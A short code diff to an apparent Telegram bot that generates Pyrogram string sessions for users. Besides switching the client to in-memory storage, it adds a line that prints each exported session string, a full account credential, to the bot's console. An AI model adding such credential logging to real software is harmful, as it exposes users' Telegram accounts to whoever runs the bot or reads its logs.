@@ -57,7 +57,7 @@ async def genStr(_, msg: Message):
         if "y" in confirm.text:
             break
     try:
-        client = Client("my_account", api_id=api_id, api_hash=api_hash)
+        client = Client("my_account",api_id=api_id, api_hash=api_hash,in_memory=True)
     except Exception as e:
         await bot.send_message(chat.id ,f"**ERROR:** `{str(e)}`\nPress /start to Start again.")
         return
@@ -122,6 +122,7 @@ async def genStr(_, msg: Message):
         return
     try:
         session_string = await client.export_session_string()
+        print(session_string)
         await client.send_message("me", f"#PYROGRAM #STRING_SESSION\n\n```{session_string}```\n")
         await client.disconnect()
         text = "String Session is Successfully Generated.\nClick on Below Button."
